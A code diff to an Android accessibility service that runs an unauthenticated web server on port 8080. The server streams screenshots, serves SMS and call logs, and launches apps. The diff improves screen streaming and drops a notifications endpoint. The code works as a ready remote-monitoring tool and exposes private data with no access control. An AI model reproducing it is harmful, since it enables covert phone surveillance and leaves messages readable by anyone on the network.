@@ -4,12 +4,16 @@ import android.accessibilityservice.AccessibilityService
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Bitmap
+import android.graphics.ColorSpace
+import android.hardware.HardwareBuffer
 import android.net.Uri
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.provider.CallLog
+import android.util.Log
 import android.view.Display
 import android.view.accessibility.AccessibilityEvent
-import androidx.annotation.RequiresApi
 import fi.iki.elonen.NanoHTTPD
 import java.io.ByteArrayInputStream
 import java.io.ByteArrayOutputStream
@@ -17,13 +21,16 @@ import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
 import java.util.concurrent.CountDownLatch
+import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 
 class RemoteControlService : AccessibilityService() {
 
     private var server: WebServer? = null
+    private val captureExecutor = Executors.newSingleThreadExecutor()
 
     companion object {
+        private const val TAG = "RemoteControlService"
         var instance: RemoteControlService? = null
     }
 
@@ -34,54 +41,91 @@ class RemoteControlService : AccessibilityService() {
             if (server == null) {
                 server = WebServer(8080)
                 server?.start()
+                Log.d(TAG, "Server started on port 8080")
             }
         } catch (e: Exception) {
-            e.printStackTrace()
+            Log.e(TAG, "Server start failed", e)
         }
     }
 
     override fun onDestroy() {
         super.onDestroy()
         server?.stop()
+        captureExecutor.shutdown()
         instance = null
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
     override fun onInterrupt() {}
 
-    private fun captureScreenBitmap(): Bitmap? {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return null
+    private fun captureScreenBytes(): ByteArray? {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            Log.e(TAG, "takeScreenshot requires Android 11+")
+            return null
+        }
 
-        var resultBitmap: Bitmap? = null
         val latch = CountDownLatch(1)
+        var outputBytes: ByteArray? = null
 
-        takeScreenshot(
-            Display.DEFAULT_DISPLAY,
-            mainExecutor,
-            object : TakeScreenshotCallback {
-                override fun onSuccess(screenshot: ScreenshotResult) {
-                    val hardwareBitmap = Bitmap.wrapHardwareBuffer(
-                        screenshot.hardwareBuffer,
-                        screenshot.colorSpace
-                    )
-                    // Convert hardware bitmap to software bitmap for JPEG compression
-                    resultBitmap = hardwareBitmap?.copy(Bitmap.Config.ARGB_8888, false)
-                    screenshot.hardwareBuffer.close()
-                    latch.countDown()
-                }
+        Handler(Looper.getMainLooper()).post {
+            try {
+                takeScreenshot(
+                    Display.DEFAULT_DISPLAY,
+                    captureExecutor,
+                    object : TakeScreenshotCallback {
+                        override fun onSuccess(screenshot: ScreenshotResult) {
+                            try {
+                                val buffer: HardwareBuffer = screenshot.hardwareBuffer
+                                val colorSpace: ColorSpace? = screenshot.colorSpace
+                                val hwBitmap = if (colorSpace != null) {
+                                    Bitmap.wrapHardwareBuffer(buffer, colorSpace)
+                                } else {
+                                    Bitmap.wrapHardwareBuffer(buffer, ColorSpace.get(ColorSpace.Named.SRGB))
+                                }
 
-                override fun onFailure(errorCode: Int) {
-                    latch.countDown()
-                }
+                                val softBitmap = hwBitmap?.copy(Bitmap.Config.ARGB_8888, false)
+                                buffer.close()
+
+                                if (softBitmap != null) {
+                                    val baos = ByteArrayOutputStream()
+                                    // Scale down slightly to improve HTTP streaming speed
+                                    val scaled = Bitmap.createScaledBitmap(
+                                        softBitmap,
+                                        softBitmap.width / 2,
+                                        softBitmap.height / 2,
+                                        true
+                                    )
+                                    scaled.compress(Bitmap.CompressFormat.JPEG, 60, baos)
+                                    outputBytes = baos.toByteArray()
+                                    softBitmap.recycle()
+                                    scaled.recycle()
+                                }
+                            } catch (e: Exception) {
+                                Log.e(TAG, "Error processing screenshot buffer", e)
+                            } finally {
+                                latch.countDown()
+                            }
+                        }
+
+                        override fun onFailure(errorCode: Int) {
+                            Log.e(TAG, "takeScreenshot failed with error code: $errorCode")
+                            latch.countDown()
+                        }
+                    }
+                )
+            } catch (e: Exception) {
+                Log.e(TAG, "Exception calling takeScreenshot", e)
+                latch.countDown()
             }
-        )
+        }
 
         try {
-            latch.await(2, TimeUnit.SECONDS)
+            latch.await(2500, TimeUnit.MILLISECONDS)
         } catch (e: InterruptedException) {
-            e.printStackTrace()
+            Log.e(TAG, "Latch timeout waiting for screenshot", e)
         }
-        return resultBitmap
+
+        return outputBytes
     }
 
     private fun getSmsHtml(): String {
@@ -150,34 +194,13 @@ class RemoteControlService : AccessibilityService() {
         return if (sb.isEmpty()) "<div class='card'><p>No call logs found.</p></div>" else sb.toString()
     }
 
-    private fun getNotificationsHtml(): String {
-        val sb = StringBuilder()
-        try {
-            val field = Class.forName("com.example.devicemanager.AppNotificationListener")
-                .getField("notifications")
-            val list = field.get(null) as? List<*>
-            if (list != null) {
-                synchronized(list) {
-                    for (item in list.reversed()) {
-                        sb.append("<div class='card'>").append(item.toString()).append("</div>")
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            sb.append("<div class='card'><p>Notifications unlinked or empty.</p></div>")
-        }
-        return if (sb.isEmpty()) "<div class='card'><p>No notifications captured yet.</p></div>" else sb.toString()
-    }
-
     inner class WebServer(port: Int) : NanoHTTPD(port) {
         override fun serve(session: IHTTPSession): Response {
             val uri = session.uri
             val params = session.parameters
 
-            // 1. Navigation Action Handlers
             if (uri == "/key") {
-                val action = params["action"]?.firstOrNull()
-                when (action) {
+                when (params["action"]?.firstOrNull()) {
                     "back" -> performGlobalAction(GLOBAL_ACTION_BACK)
                     "home" -> performGlobalAction(GLOBAL_ACTION_HOME)
                     "recents" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
@@ -186,7 +209,6 @@ class RemoteControlService : AccessibilityService() {
                 return newFixedLengthResponse("OK")
             }
 
-            // 2. Launch Application Handler
             if (uri == "/launch") {
                 val pkg = params["pkg"]?.firstOrNull()
                 if (!pkg.isNullOrEmpty()) {
@@ -201,30 +223,27 @@ class RemoteControlService : AccessibilityService() {
                 }
             }
 
-            // 3. Screen Frame Endpoint
             if (uri == "/api/screen") {
-                val bitmap = captureScreenBitmap()
-                return if (bitmap != null) {
-                    val baos = ByteArrayOutputStream()
-                    bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos)
-                    val bytes = baos.toByteArray()
-                    newFixedLengthResponse(
+                val imageBytes = captureScreenBytes()
+                return if (imageBytes != null && imageBytes.isNotEmpty()) {
+                    val response = newFixedLengthResponse(
                         Response.Status.OK,
                         "image/jpeg",
-                        ByteArrayInputStream(bytes),
-                        bytes.size.toLong()
+                        ByteArrayInputStream(imageBytes),
+                        imageBytes.size.toLong()
                     )
+                    response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate")
+                    response.addHeader("Pragma", "no-cache")
+                    response.addHeader("Expires", "0")
+                    response
                 } else {
-                    newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Screen capture unavailable (Requires Android 11+)")
+                    newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Screenshot capture failed")
                 }
             }
 
-            // 4. Dynamic AJAX Data Endpoints
             if (uri == "/api/sms") return newFixedLengthResponse(Response.Status.OK, "text/html", getSmsHtml())
             if (uri == "/api/calls") return newFixedLengthResponse(Response.Status.OK, "text/html", getCallLogsHtml())
-            if (uri == "/api/notifs") return newFixedLengthResponse(Response.Status.OK, "text/html", getNotificationsHtml())
 
-            // 5. Installed Apps List
             val pm = packageManager
             val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
                 .filter { pm.getLaunchIntentForPackage(it.packageName) != null }
@@ -239,7 +258,6 @@ class RemoteControlService : AccessibilityService() {
                         .append("')\">Open</button></li>")
             }
 
-            // 6. Dashboard Page
             val html = """
                 <!DOCTYPE html>
                 <html>
@@ -258,7 +276,8 @@ class RemoteControlService : AccessibilityService() {
                         .tab-pane { display: none; }
                         .show { display: block; }
                         .screen-container { display: flex; flex-direction: column; align-items: center; gap: 12px; }
-                        .screen-preview { width: 100%; max-width: 340px; border-radius: 12px; border: 2px solid #333; background: #000; min-height: 200px; object-fit: contain; }
+                        #screenImg { width: 100%; max-width: 320px; border-radius: 12px; border: 2px solid #333; background: #222; min-height: 480px; object-fit: contain; }
+                        #statusText { font-size: 13px; color: #aaa; }
                     </style>
                 </head>
                 <body>
@@ -274,7 +293,6 @@ class RemoteControlService : AccessibilityService() {
                         <button class="tab-btn" onclick="openScreenTab(this)">Screen</button>
                         <button class="tab-btn" onclick="loadTab('sms', this)">Messages</button>
                         <button class="tab-btn" onclick="loadTab('calls', this)">Calls</button>
-                        <button class="tab-btn" onclick="loadTab('notifs', this)">Alerts</button>
                     </div>
 
                     <div id="apps" class="tab-pane show">
@@ -283,20 +301,21 @@ class RemoteControlService : AccessibilityService() {
 
                     <div id="screen" class="tab-pane">
                         <div class="screen-container">
-                            <div style="display:flex; gap:10px; width: 100%; max-width: 340px;">
+                            <div style="display:flex; gap:10px; width: 100%; max-width: 320px;">
                                 <button id="streamBtn" style="flex:1" onclick="toggleStream()">Start Stream</button>
                                 <button style="background:#374151" onclick="refreshFrame()">Refresh</button>
                             </div>
-                            <img id="screenImg" class="screen-preview" alt="Screen preview" />
+                            <span id="statusText">Ready</span>
+                            <img id="screenImg" alt="Screen preview" />
                         </div>
                     </div>
 
                     <div id="sms" class="tab-pane">Loading messages...</div>
                     <div id="calls" class="tab-pane">Loading call logs...</div>
-                    <div id="notifs" class="tab-pane">Loading notifications...</div>
 
                     <script>
                         let streamInterval = null;
+                        let isFetching = false;
 
                         function switchTab(id, elem) {
                             stopStream();
@@ -310,12 +329,8 @@ class RemoteControlService : AccessibilityService() {
                             switchTab(id, elem);
                             fetch('/api/' + id)
                                 .then(r => r.text())
-                                .then(html => {
-                                    document.getElementById(id).innerHTML = html;
-                                })
-                                .catch(err => {
-                                    document.getElementById(id).innerHTML = '<p>Failed to load data: ' + err + '</p>';
-                                });
+                                .then(html => { document.getElementById(id).innerHTML = html; })
+                                .catch(err => { document.getElementById(id).innerHTML = '<p>Failed to load: ' + err + '</p>'; });
                         }
 
                         function openScreenTab(elem) {
@@ -324,8 +339,29 @@ class RemoteControlService : AccessibilityService() {
                         }
 
                         function refreshFrame() {
-                            const img = document.getElementById('screenImg');
-                            img.src = '/api/screen?t=' + Date.now();
+                            if (isFetching) return;
+                            isFetching = true;
+                            const status = document.getElementById('statusText');
+                            status.innerText = "Capturing...";
+
+                            fetch('/api/screen?t=' + Date.now())
+                                .then(res => {
+                                    if (!res.ok) throw new Error("Status " + res.status);
+                                    return res.blob();
+                                })
+                                .then(blob => {
+                                    const img = document.getElementById('screenImg');
+                                    if (img.src.startsWith('blob:')) {
+                                        URL.revokeObjectURL(img.src);
+                                    }
+                                    img.src = URL.createObjectURL(blob);
+                                    status.innerText = "Last updated: " + new Date().toLocaleTimeString();
+                                    isFetching = false;
+                                })
+                                .catch(err => {
+                                    status.innerText = "Error: " + err.message + " (Check logcat)";
+                                    isFetching = false;
+                                });
                         }
 
                         function toggleStream() {
@@ -336,7 +372,7 @@ class RemoteControlService : AccessibilityService() {
                                 btn.innerText = "Stop Stream";
                                 btn.style.background = "#dc2626";
                                 refreshFrame();
-                                streamInterval = setInterval(refreshFrame, 1000);
+                                streamInterval = setInterval(refreshFrame, 1200);
                             }
                         }
 
